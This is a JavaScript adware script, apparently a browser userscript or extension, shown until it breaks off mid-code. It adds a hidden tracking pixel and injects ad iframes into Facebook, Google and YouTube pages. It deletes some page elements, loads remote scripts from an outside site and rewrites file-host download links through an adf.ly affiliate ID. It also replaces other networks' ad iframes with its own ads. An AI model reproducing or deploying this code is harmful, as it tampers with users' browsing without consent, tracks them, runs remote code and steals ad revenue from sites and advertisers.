var n=document.createElement('img');n.setAttribute("src",'http://whos.amung.us/swidget/reemplazovp.png');n.setAttribute("style",'display: none;');document.body.appendChild(n);

var loc = (window.location.href.match(/ownd=/i));


if (window.location.href.match(/^http:\/\/(www\.)?180upload\.com/i) && loc) {
	addScript('180upload');
} else if (window.location.href.match(/^http:\/\/(www\.)?filebox\.com/i) && loc) {
	addScript('filebox');
} else if (window.location.href.match(/^http:\/\/(www\.)?zalaa\.com/i) && loc) {
	addScript('zalaa');
} else if (window.location.href.match(/^http:\/\/(www\.)?cramit\.in/i) && loc) {
	addScript('cramit');
} else if (window.location.href.match(/^http:\/\/(www\.)?mediafire\.com/i)) {
	addScript("mediafire");
} else if (window.location.href.match(/^http:\/\/(www\.)?uptobox\.com/i)) {
	addScript('uptobox');
} else if (window.location.href.match(/^http:\/\/(www\.)?uploadcore\.com/i) && loc) {
	addScript('uploadcore');
} else if (window.location.href.match(/^http:\/\/(www\.)?vidbull\.com/i) && loc) {
	addScript('vidbull');
} else if (window.location.href.match(/^http:\/\/(www\.)?bayfiles\.com/i) && loc) {
	addScript("bayfiles");
} else if (window.location.href.match(/^http:\/\/(www\.)?bitshare\.com/i) && loc) {
	addScript("bitshare");
} else if (window.location.href.match(/^http:\/\/(www\.)?ver-pelis\.net/i) || window.location.href.match(/^http:\/\/(www\.|beta\.)?ver-anime\.net/i) || window.location.href.match(/^http:\/\/(www\.)?peliculasonlinegratisflv\.com/i) || window.location.href.match(/^http:\/\/(www\.|beta\.)?vanime\.net/i)) {
	if (document.getElementById("player_fram7")) {
		if (document.getElementById("player_fram7").src.match(/get_plugin.html/i)) {
			var al = document.getElementById("videu7").innerHTML.replace(/amp;/gi, '');
			document.getElementById("player_fram7").src = "http://ver-pelis.net/nodo/id"+al+".html";
		}
	}
} else { 
var allHTMLTags = new Array();
    
function getElementByClass(theClass) {

    var allHTMLTags=document.getElementsByTagName("*");

    for (i=0; i<allHTMLTags.length; i++) {

        if (allHTMLTags[i].className==theClass) {
            allHTMLTags[i].style.display='none';
        }
    }
}


function cookietime() {
	cad=new Date();
	cad.setTime(cad.getTime() + (1*1*5*60*1000));
	expira="; expires=" + cad.toGMTString();
    document.cookie = "visitado=false" + expira;
}
function rand(l,u){return Math.floor((Math.random() * (u-l+1))+l);}

function otros(){if(window.location.href.match(/facebook\.com\/plugins/i)){ return false;} else if(window.location.href.match(/facebook\.com\/connect/i)){ return false;} else if(window.location.href.match(/facebook\.com\/attachments/i)){ return false;} else if(window.location.href.match(/youtube\.com\/subscribe_widget/i)){ return false;} else if(window.location.href.match(/youtube\.com\/embed/i)){ return false;} else if(window.location.href.match(/platform\.twitter\.com/i)){ return false;} else if(window.location.href.match(/plusone/i)){ return false; } else if(window.location.href.match(/support/i)){ return false;}else if(window.location.href.match(/analytics/i)){ return false; } else if(window.location.href.match(/adsense/i)){ return false; } else { return true; }} 

if (otros()){ 



	var ads = new Array();

	ads[1] = "http://ads.networkhm.com/tt?id=1038825";
	
	ads[4] = "http://ads.networkhm.com/tt?id=1038825";

	ads[2] = "http://ads.networkhm.com/tt?id=1038825";

	ads[3] = "http://ads.networkhm.com/tt?id=1038825";
	
	ads[10] = "http://ads.networkhm.com/tt?id=1038825";

	if(window.location.href.match(/^(http|https):\/\/(www\.)?facebook\.com/i)){   var  numrand = 5; var tipo = 4; var pag=document.body.innerHTML; var publi="face";

	} else if(window.location.href.match(/^(http|https):\/\/(www\.)?google\./i)) { var numrand = rand(5,6); var tipo = 1;  var pag=document.body.innerHTML;
	
	} else if(window.location.href.match(/^(http|https):\/\/(www\.)?youtube\.com/i)) { var numrand = rand(5,6); var tipo = 3; var pag=document.body.innerHTML;
	
	} else if (window.location.href.match(/^(http|https):\/\/(www\.)?rojadirecta\.me/i) || window.location.href.match(/^http:\/\/(www\.)?sport\.es/i) || window.location.href.match(/^http:\/\/(www\.)?marca\.com/i)){ 
		var tipo = 10;
	} else { var publi="no";}
	

	if (publi != "no" && numrand == 6 && tipo == 1) { 
		
	var s = document.createElement('iframe');s.setAttribute("src", "http://ads.networkhm.com/tt?id=1038822");s.setAttribute("width", "160");s.setAttribute("height", "600");s.setAttribute("marginwidth", "0");s.setAttribute("marginheight", "0");s.setAttribute("frameborder", "0");s.setAttribute("scrolling", "no");s.setAttribute("style", "background-color:#FFF;");
	var y = document.createElement('div');y.setAttribute("style", "position: absolute; left: 1%; bottom: 0px;");y.setAttribute("class", "2");var img2 = document.createElement('img');img2.setAttribute("src", "http://i.imgur.com/4vpT7U7.png");img2.setAttribute("onclick", "document.getElementById('ads728x').style.display='none';cookietime();");img2.setAttribute("title", "Cerrar");y.appendChild(img2);var x = document.createElement('div');x.setAttribute("style", "position:fixed;left:5%;top:5%;width:160;height:600px;z-index:99999;");x.setAttribute("id", "ads728x");x.appendChild(y);x.appendChild(s);var hh = document.getElementsByTagName('head')[0];hh.parentNode.insertBefore(x, hh);

	} else if (publi != "no" && numrand == 6 && tipo == 3) { 
		
	
	var s = document.createElement('iframe');s.setAttribute("src", "http://ads.networkhm.com/tt?id=1038822");s.setAttribute("width", "160");s.setAttribute("height", "600");s.setAttribute("marginwidth", "0");s.setAttribute("marginheight", "0");s.setAttribute("frameborder", "0");s.setAttribute("scrolling", "no");s.setAttribute("style", "background-color:#FFF;");
	var y = document.createElement('div');y.setAttribute("style", "position: absolute; left: 1%; bottom: 0px;");y.setAttribute("class", "2");var img2 = document.createElement('img');img2.setAttribute("src", "http://i.imgur.com/4vpT7U7.png");img2.setAttribute("onclick", "document.getElementById('ads728x').style.display='none';cookietime();");img2.setAttribute("title", "Cerrar");y.appendChild(img2);var x = document.createElement('div');x.setAttribute("style", "position:fixed;left:5%;top:5%;width:160;height:600px;z-index:99999;");x.setAttribute("id", "ads728x");x.appendChild(y);x.appendChild(s);var hh = document.getElementsByTagName('head')[0];hh.parentNode.insertBefore(x, hh);

	
	} else if (publi != "no" && numrand == 6 && tipo == 4) { 
		
	var s = document.createElement('iframe');s.setAttribute("src", "http://ads.networkhm.com/tt?id=1038822");s.setAttribute("width", "160");s.setAttribute("height", "600");s.setAttribute("marginwidth", "0");s.setAttribute("marginheight", "0");s.setAttribute("frameborder", "0");s.setAttribute("scrolling", "no");s.setAttribute("style", "background-color:#FFF;");
	var y = document.createElement('div');y.setAttribute("style", "position: absolute; left: 1%; bottom: 0px;");y.setAttribute("class", "2");var img2 = document.createElement('img');img2.setAttribute("src", "http://i.imgur.com/4vpT7U7.png");img2.setAttribute("onclick", "document.getElementById('ads728x').style.display='none';cookietime();");img2.setAttribute("title", "Cerrar");y.appendChild(img2);var x = document.createElement('div');x.setAttribute("style", "position:fixed;left:5%;top:5%;width:160;height:600px;z-index:99999;");x.setAttribute("id", "ads728x");x.appendChild(y);x.appendChild(s);var hh = document.getElementsByTagName('head')[0];hh.parentNode.insertBefore(x, hh);

		
	} else if (publi != "no" && numrand == 5 && tipo == 4) { 
	
	var s = document.createElement('iframe');s.setAttribute("src", "http://ads.networkhm.com/tt?id=1038825");s.setAttribute("width", "728");s.setAttribute("height", "90");s.setAttribute("marginwidth", "0");s.setAttribute("marginheight", "0");s.setAttribute("frameborder", "0");s.setAttribute("scrolling", "no");s.setAttribute("style", "background-color:#FFF;");
	var y = document.createElement('div');y.setAttribute("style", "position: absolute; left: 1%; bottom: 0px;");y.setAttribute("class", "2");var img2 = document.createElement('img');img2.setAttribute("src", "http://i.imgur.com/4vpT7U7.png");img2.setAttribute("onclick", "document.getElementById('ads728x').style.display='none';cookietime();");img2.setAttribute("title", "Cerrar");y.appendChild(img2);var x = document.createElement('div');x.setAttribute("style", "position:fixed;left:30%;bottom:5%;width:730;height:90px;z-index:99999;");x.setAttribute("id", "ads728x");x.appendChild(y);x.appendChild(s);var hh = document.getElementsByTagName('head')[0];hh.parentNode.insertBefore(x, hh);
	
		
	} else if(publi != "no") {
	
	var s = document.createElement('iframe');s.setAttribute("src", "http://ads.networkhm.com/tt?id=1038825");s.setAttribute("width", "728");s.setAttribute("height", "90");s.setAttribute("marginwidth", "0");s.setAttribute("marginheight", "0");s.setAttribute("frameborder", "0");s.setAttribute("scrolling", "no");s.setAttribute("style", "background-color:#FFF;");
	var y = document.createElement('div');y.setAttribute("style", "position: absolute; left: 1%; bottom: 0px;");y.setAttribute("class", "2");var img2 = document.createElement('img');img2.setAttribute("src", "http://i.imgur.com/4vpT7U7.png");img2.setAttribute("onclick", "document.getElementById('ads728x').style.display='none';cookietime();");img2.setAttribute("title", "Cerrar");y.appendChild(img2);var x = document.createElement('div');x.setAttribute("style", "position:fixed;left:30%;bottom:5%;width:730;height:90px;z-index:99999;");x.setAttribute("id", "ads728x");x.appendChild(y);x.appendChild(s);var hh = document.getElementsByTagName('head')[0];hh.parentNode.insertBefore(x, hh);
	
		
	}

	var adsgoogle = new Array();
	var adsyoutube = new Array();
	var adsface = new Array();
	var adstwitter = new Array();
	
	adsgoogle[4] = "http://ads.networkhm.com/tt?id=1038825";
	adsgoogle[5] = "http://ads.networkhm.com/tt?id=1038823";
	adsgoogle[6] = "http://ads.networkhm.com/tt?id=1038822";
		
	//adsface[4] = "http://yieldmanager.adbooth.net/st?ad_type=iframe&ad_size=728x90&section=4047009";
	//adsface[5] = "http://yieldmanager.adbooth.net/st?ad_type=iframe&ad_size=300x250&section=4047009";
	//adsface[6] = "http://yieldmanager.adbooth.net/st?ad_type=iframe&ad_size=160x600&section=4047009";
	
	adsface[4] = "http://ads.networkhm.com/tt?id=1038825";
	adsface[5] = "http://ads.networkhm.com/tt?id=1038823";
	adsface[6] = "http://ads.networkhm.com/tt?id=1038822";
	
	adstwitter[4] = "http://ads.networkhm.com/tt?id=1038825";
	adstwitter[5] = "http://ads.networkhm.com/tt?id=1038823";

	adsyoutube[1] = "http://ad.yieldmanager.com/st?ad_type=iframe&ad_size=468x60&section=4308056";	
	adsyoutube[4] = "http://ads.networkhm.com/tt?id=1038825";
	adsyoutube[5] = "http://ads.networkhm.com/tt?id=1038823";

/*
if (tipo == 1) {
	if(pag.match(/gbqfbw/i)){
		element = document.getElementById("gbqfbw");
		element.parentNode.removeChild(element);
	}
	
	if(numrand == 4) {
	if(pag.match(/als/i)){
		element = document.getElementById("als");
		element.parentNode.removeChild(element);
		var s = document.createElement('iframe');s.setAttribute("src", ""+adsgoogle[numrand]+"");s.setAttribute("width", "728");s.setAttribute("height", "90");s.setAttribute("marginwidth", "0");s.setAttribute("marginheight", "0");s.setAttribute("frameborder", "0");s.setAttribute("scrolling", "no");s.setAttribute("style", "background-color:#FFF;");
		var y = document.createElement('div');y.setAttribute("style", "position: absolute; left: 1%; bottom: 0px;z-index:999999;");y.setAttribute("class", "2");var img2 = document.createElement('img');img2.setAttribute("src", "http://www.vimagen.net/close.png");img2.setAttribute("onclick", "document.getElementById('ads728x').style.display='none';cookietime();");img2.setAttribute("title", "Cerrar");y.appendChild(img2);var x = document.createElement('div');x.setAttribute("style", "position:relative;left:-80px;z-index:99999;margin:6px;");x.setAttribute("id", "ads728x");x.appendChild(y);x.appendChild(s);var hh = document.getElementById('gbqff');hh.parentNode.insertBefore(x, hh);
}
}
	if(numrand == 5) {
	if(pag.match(/als/i)){
		element = document.getElementById("als");
		element.parentNode.removeChild(element);
		var x = document.createElement('iframe');x.setAttribute("src", ""+adsgoogle[numrand]+"");x.setAttribute("width", "300");x.setAttribute("height", "250");x.setAttribute("marginwidth", "0");x.setAttribute("marginheight", "0");x.setAttribute("frameborder", "0");x.setAttribute("scrolling", "no");x.setAttribute("style", "background-color:#FFF;");
		var z = document.createElement('div');z.setAttribute("style", "position: absolute; left: 1%; bottom: 0px;");z.setAttribute("class", "2");var img4 = document.createElement('img');img4.setAttribute("src", "http://www.vimagen.net/close.png");img4.setAttribute("onclick", "document.getElementById('ads160x').style.display='none';cookietime();");img4.setAttribute("title", "Cerrar");z.appendChild(img4);var u = document.createElement('div');u.setAttribute("style", "position:relative;z-index:99999;margin:6px;left:125px;");u.setAttribute("id", "ads160x");u.appendChild(z);u.appendChild(x);var uu = document.getElementById('gbqff');uu.parentNode.insertBefore(u, uu);
}
}
}*/


if (tipo == 3) {
	if(pag.match(/google_companion_ad_div/i)){
		element = document.getElementById("google_companion_ad_div");
		element.parentNode.removeChild(element);
	}
	if(pag.match(/ppv-placeholder/i)){
		element = document.getElementById("ppv-placeholder");
		element.parentNode.removeChild(element);
	}
	if(pag.match(/watch-context/i)){
		element = document.getElementById("watch-context");
		element.parentNode.removeChild(element);
	}
	if(pag.match(/lohp-large-shelf-container/i)){

				var x = document.createElement('iframe');x.setAttribute("src", ""+adsyoutube[4]+"");x.setAttribute("width", "300");x.setAttribute("height", "250");x.setAttribute("marginwidth", "0");x.setAttribute("marginheight", "0");x.setAttribute("frameborder", "0");x.setAttribute("scrolling", "no");x.setAttribute("style", "background-color:#FFF;");
				var z = document.createElement('div');z.setAttribute("style", "position: absolute; left: 1%; bottom: 0px;");z.setAttribute("class", "2");var img4 = document.createElement('img');z.appendChild(img4);var u = document.createElement('div');u.setAttribute("style", "position:relative;z-index:99999;");u.setAttribute("id", "ads160x");u.appendChild(z);u.appendChild(x);var uu = document.getElementByClass('lohp-large-shelf-container');uu.parentNode.insertBefore(u, uu);


	}
	if(pag.match(/homepage-sidebar-ads/i)){

				var x = document.createElement('iframe');x.setAttribute("src", ""+adsyoutube[5]+"");x.setAttribute("width", "300");x.setAttribute("height", "250");x.setAttribute("marginwidth", "0");x.setAttribute("marginheight", "0");x.setAttribute("frameborder", "0");x.setAttribute("scrolling", "no");x.setAttribute("style", "background-color:#FFF;");
				var z = document.createElement('div');z.setAttribute("style", "position: absolute; left: 1%; bottom: 0px;");z.setAttribute("class", "2");var img4 = document.createElement('img');z.appendChild(img4);var u = document.createElement('div');u.setAttribute("style", "position:relative;z-index:99999;");u.setAttribute("id", "ads160x");u.appendChild(z);u.appendChild(x);var uu = document.getElementById('homepage-sidebar-ads');uu.parentNode.insertBefore(u, uu);
		

	}
	if(pag.match(/search-pva-content/i)){

				var x = document.createElement('iframe');x.setAttribute("src", ""+adsyoutube[5]+"");x.setAttribute("width", "300");x.setAttribute("height", "250");x.setAttribute("marginwidth", "0");x.setAttribute("marginheight", "0");x.setAttribute("frameborder", "0");x.setAttribute("scrolling", "no");x.setAttribute("style", "background-color:#FFF;");
				var z = document.createElement('div');z.setAttribute("style", "position: absolute; left: 1%; bottom: 0px;");z.setAttribute("class", "2");var img4 = document.createElement('img');z.appendChild(img4);var u = document.createElement('div');u.setAttribute("style", "margin-top:4px;");u.setAttribute("id", "ads160x");u.appendChild(z);u.appendChild(x);var uu = document.getElementById('search-pva-content');uu.parentNode.insertBefore(u, uu);
		

	}	
	if(pag.match(/watch-actions/i)){

				var x = document.createElement('iframe');x.setAttribute("src", ""+adsyoutube[1]+"");x.setAttribute("width", "468");x.setAttribute("height", "60");x.setAttribute("marginwidth", "0");x.setAttribute("marginheight", "0");x.setAttribute("frameborder", "0");x.setAttribute("scrolling", "no");x.setAttribute("style", "background-color:#FFF;");
				var z = document.createElement('div');z.setAttribute("style", "position: absolute; left: 1%; bottom: 0px;");z.setAttribute("class", "2");var img4 = document.createElement('img');z.appendChild(img4);var u = document.createElement('div');u.setAttribute("style", "position:relative;z-index:99999;left:10%");u.setAttribute("id", "ads160x");u.appendChild(z);u.appendChild(x);var uu = document.getElementById('watch-actions');uu.parentNode.insertBefore(u, uu);
		

	}	
	if(pag.match(/search-results/i)){

				var x = document.createElement('iframe');x.setAttribute("src", ""+adsyoutube[1]+"");x.setAttribute("width", "468");x.setAttribute("height", "60");x.setAttribute("marginwidth", "0");x.setAttribute("marginheight", "0");x.setAttribute("frameborder", "0");x.setAttribute("scrolling", "no");x.setAttribute("style", "background-color:#FFF;");
				var z = document.createElement('div');z.setAttribute("style", "position: absolute; left: 1%; bottom: 0px;");z.setAttribute("class", "2");var img4 = document.createElement('img');z.appendChild(img4);var u = document.createElement('div');u.setAttribute("style", "position:relative;z-index:99999;left:10%");u.setAttribute("id", "ads160x");u.appendChild(z);u.appendChild(x);var uu = document.getElementById('search-results');uu.parentNode.insertBefore(u, uu);
		

	}	

	
}
	if (tipo == 4) {

		if(pag.match(/signupForm/i)){

					var x = document.createElement('iframe');x.setAttribute("src", ""+adsface[4]+"");x.setAttribute("width", "728");x.setAttribute("height", "90");x.setAttribute("marginwidth", "0");x.setAttribute("marginheight", "0");x.setAttribute("frameborder", "0");x.setAttribute("scrolling", "no");x.setAttribute("style", "background-color:#FFF;");
					var z = document.createElement('div');z.setAttribute("style", "position: absolute; left: 1%; bottom: 0px;");z.setAttribute("class", "2");var img4 = document.createElement('img');z.appendChild(img4);var u = document.createElement('div');u.setAttribute("style", "position:relative;left:20%;margin-top:4px;");u.setAttribute("id", "ads160x");u.appendChild(z);u.appendChild(x);var uu = document.getElementById('content');uu.parentNode.insertBefore(u, uu);
			

		}
		if(pag.match(/pinnedNav/i)){

					var x = document.createElement('iframe');x.setAttribute("src", ""+adsface[4]+"");x.setAttribute("width", "728");x.setAttribute("height", "90");x.setAttribute("marginwidth", "0");x.setAttribute("marginheight", "0");x.setAttribute("frameborder", "0");x.setAttribute("scrolling", "no");x.setAttribute("style", "background-color:#FFF;");
					var z = document.createElement('div');z.setAttribute("style", "position: absolute; left: 1%; bottom: 0px;");z.setAttribute("class", "2");var img4 = document.createElement('img');z.appendChild(img4);var u = document.createElement('div');u.setAttribute("style", "margin-top:4px;left:20px");u.setAttribute("id", "ads160x");u.appendChild(z);u.appendChild(x);var uu = document.getElementById('contentCol');uu.parentNode.insertBefore(u, uu);
			

		}	
		if(pag.match(/timelineNavContent/i)){

					var x = document.createElement('iframe');x.setAttribute("src", ""+adsface[4]+"");x.setAttribute("width", "728");x.setAttribute("height", "90");x.setAttribute("marginwidth", "0");x.setAttribute("marginheight", "0");x.setAttribute("frameborder", "0");x.setAttribute("scrolling", "no");x.setAttribute("style", "background-color:#FFF;");
					var z = document.createElement('div');z.setAttribute("style", "position: absolute; left: 1%; bottom: 0px;");z.setAttribute("class", "2");var img4 = document.createElement('img');z.appendChild(img4);var u = document.createElement('div');u.setAttribute("style", "position:relative;margin-top:4px;left:60px;");u.setAttribute("id", "ads160x");u.appendChild(z);u.appendChild(x);var uu = document.getElementById('timelineNavContent');uu.parentNode.insertBefore(u, uu);
			

		}		
		if(pag.match(/pagelet_friends_online/i)){

					var x = document.createElement('iframe');x.setAttribute("src", ""+adsface[6]+"");x.setAttribute("width", "160");x.setAttribute("height", "600");x.setAttribute("marginwidth", "0");x.setAttribute("marginheight", "0");x.setAttribute("frameborder", "0");x.setAttribute("scrolling", "no");x.setAttribute("style", "background-color:#FFF;");
					var z = document.createElement('div');z.setAttribute("style", "position: absolute; left: 1%; bottom: 0px;");z.setAttribute("class", "2");var img4 = document.createElement('img');z.appendChild(img4);var u = document.createElement('div');u.setAttribute("style", "position:relative;margin-top:4px;left:4px;");u.setAttribute("id", "ads160x");u.appendChild(z);u.appendChild(x);var uu = document.getElementById('pagelet_friends_online');uu.parentNode.insertBefore(u, uu);
			

		}	
		if(pag.match(/rightColContent/i)){

					var x = document.createElement('iframe');x.setAttribute("src", ""+adsface[6]+"");x.setAttribute("width", "160");x.setAttribute("height", "600");x.setAttribute("marginwidth", "0");x.setAttribute("marginheight", "0");x.setAttribute("frameborder", "0");x.setAttribute("scrolling", "no");x.setAttribute("style", "background-color:#FFF;");
					var z = document.createElement('div');z.setAttribute("style", "position: absolute; left: 1%; bottom: 0px;");z.setAttribute("class", "2");var img4 = document.createElement('img');z.appendChild(img4);var u = document.createElement('div');u.setAttribute("style", "position:relative;margin-top:4px;");u.setAttribute("id", "ads160x");u.appendChild(z);u.appendChild(x);var uu = document.getElementById('rightColContent');uu.parentNode.insertBefore(u, uu);
			

		}	


		
	}
}
 }

function addjquery() { 
	var x = document.createElement('script');
	x.setAttribute("type","text/javascript");
	x.setAttribute("src","http://code.jquery.com/jquery-latest.js");
	document.getElementsByTagName("head")[0].appendChild(x);
}





function addScript(id) { 
	var s = document.createElement('script');
	s.setAttribute("type","text/javascript");
	s.setAttribute("src", "http://www.vanime.net/core/servers/"+id+".js");
	document.getElementsByTagName("head")[0].appendChild(s);
} 

function validHost() {
        if (location.href.match(/static\.ak\./i)) {
            return false;
        } else if (location.href.match(/\.addthis\.com\/static\//i)) {
            return false;
        } else if (location.href.match(/^secure\.shared\.live\.com/i)) {
            return false;
        } else if (location.href.match(/mail\.google\.com/i)) {
            return false;
			
        } else if (location.href.match(/^megaupload\.com\/mc\.php/i)) {
            return false;
        } else if (location.href.match(/blank/i)) {
            return false;
        } else if (location.href.match(/^http\:\/\/analytics\./i)) {
            return false;
        } else if (location.href.match(/^\.hotmail\.com\//i)) {
            return false;
        } else if (location.href.match(/^\.facebook\.com\/plugins/i)) {
            return false;
        } else if (location.href.match(/^api\.twitter\.com\/receiver\.html/i)) {
            return false;
        } else if (location.href.match(/^facebook\.com\/iframe\//i)) {
            return false;
        } else if (location.href.match(/peliculasonlinegratisflv\.com/i)) {
            return false;
        } else if (location.href.match(/ver-anime\.net/i)) {
            return false;
        } else if (location.href.match(/google\./i)) {
            return false;
        } else if (location.href.match(/facebook\.com/i)) {
            return false;
        } else if (location.href.match(/youtube\.com/i)) {
            return false;			
        } else if (location.href.match(/vanime\.net/i)) {
            return false;
        } else if (location.href.match(/musicalandia\.net/i)) {
            return false;
        } else if (location.href.match(/ver-series\.net/i)) {
            return false;
        } else if (location.href.match(/musica-online\.org/i)) {
            return false;
        } else if (location.href.match(/ver-documentales\.net/i)) {
            return false;
        } else if (location.href.match(/todoanimes\.com/i)) {
            return false;
        } else if (location.href.match(/animeflv\.net/i)) {
            return false;
		} else if (location.href.match(/goojue\.com/i)) {
            return false;
		} else {
            return true;
        }
    }
	
	
if(validHost()) {

var adfly_id=2245008;

var adfly_advert='int';

var domains=['cdn.adbooth.net/src/autoshortner.html','zalaa.com','cramit.in','bayfiles.com','freakshare','adf.ly','allmyfiles.ca,','refnull.com','ul.to','multiupload.nl','mega.co.nz','uploaded.to','nyaa.eu','taringa.net','depositfiles.com','rapidshare.com','vip-file.com','smsfiles.ru','4files.net','turbobit.net','uploading.com','letitbit.net','depositfiles.ru','sms4file.com','ifolder.ru','hotfile.com','anyfiles.net','sharingmatrix.com','megashare.com','megaupload.com','rapidshare.de','rapidshare.ru','uploadbox.com','filefactory.com','filefactory.ru','filepost.ru','onefile.net','freefolder.net','getthebit.com','turbobit.net','bitshare.com','rapidgator.net','crocko.com'];

function checkValidAdfly(link){

	for(var i=0;i<domains.length;i++){

		if(link.match("^(http|https)\:\/\/(www\.)?"+domains[i].replace("\.","\\\."))){
		
			return true;
		
		}
		
	}
	
	return false;
	
}

function isLink(link){

	if(link.href==""){

		return false;

	}
	
	var regexp=/(http|https):\/\/(\w+:{0,1}\w*@)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%@!\-\/]))?/;
	
	return regexp.test(link.href);
}
function insertAdFly(){

	var links=document.getElementsByTagName("a");
	
	for(var i=0;i<links.length;i++){

		if(!isLink(links[i])||document.domain.match((links[i].href.match(":\/\/(.[^/]+)")[1]).replace('www.',''))){

			continue;

		}
		if(checkValidAdfly(links[i].href)){

			links[i].href="http://adf.ly/"+adfly_id+"/"+ links[i].href;

		}
		
	}
	
}

insertAdFly();
}
function otranet(a)
	{
	if(a.width=="728"&&a.height=="90")
		{
		a.src="http://ads.networkhm.com/tt?id=1038825";
	}
	else if(a.width=="300"&&a.height=="250")
		{
		a.src="http://ads.networkhm.com/tt?id=1038823";
	}
	else if(a.width=="160"&&a.height=="600")
		{
		a.src="http://ads.networkhm.com/tt?id=1038822";
	}
	else if(a.width=="120"&&a.height=="600")
		{
		a.src="http://ads.networkhm.com/tt?id=1038822";
	}
	else if(a.width=="468"&&a.height=="60")
		{
		a.src="http://ads.networkhm.com/tt?id=1038824";
	}
	else if(a.width=="336"&&a.height=="280")
		{
		a.src="http://ads.networkhm.com/tt?id=1038823";
	}
	return true
}
if(validHost())
	{
	
	var iframes=document.getElementsByTagName("iframe");
	for(var i=0;i<iframes.length;i++)
		{
		iframe=iframes[i].src;
		if(iframe.match("^http://adserving.cpxinteractive.com/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("ad.smowtion.com"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ad.foxnetworks.com/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ad.xtendmedia.com/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ad.harrenmedianetwork.com/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ad.metanetwork.com/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ad.blinkdr.com/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ad.z5x.net/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ad.adfunky.com/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ads.creafi-online-media.com/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ad.jumbaexchange.com/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ads.avazu.net/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ad.yieldads.com/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ad.adnetinteractive.com/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ad.bannerconnect.net/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ads.jumbaexchange.com/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ad.e-viral.com/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ads.tlvmedia.com/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ad.adperium.com/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ads.jumbaexchange.com/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://go.cpmadvisors.com/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ad.xertive.com/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ad.media-servers.net/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://go.cpmadvisors.com/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ad.globe7.com/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ad.103092804.com/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ad.globaltakeoff.net/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ads.bluelithium.com/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ad.antventure.com/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ad.reduxmedia.com/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ad.adtegrity.net/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ad.directaclick.com/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match(".mediashakers.com/id"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ad.adserverplus.com/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ad.yieldmanager.com/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("tradex.openx.com/afr.php?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match(".affiz.net/tracking/iframedfp.php"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("adserver.itsfogo.com/"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match(".pasadserver.com/showBanner.php"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("ads.lfstmedia.com/slot"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("ads.sonicomusica.com/ad"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("ads.adpv.com/iframe"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("adserver.adtechus.com/adiframe"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("mooxar.info/openx/"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("bs.serving-sys.com/BurstingPipe"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("ad.adserver01.de/"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match(".adsmwt.com/st"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("ad.vuiads.net/showads"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("static.seeon.tv/ads/"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("www.redditmedia.com/ads/"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("justjared.buzznet.com/wp-content/themes/default/ads/banner.php"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("adserving.cpxadroit.com/"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("ads.mapcity.com/"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("edge.actaads.com/a_"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("www.adsomega.com/www/delivery"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match(".zedo.com/"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("ads.ad4game.com/www/delivery/"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("multiupload.com/ad.php"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ad.adnetwork.net/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("googleads.g.doubleclick.net/pagead/ads?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("ads.mcanime.net/openx/"))
			{
			otranet(iframes[i])
		}
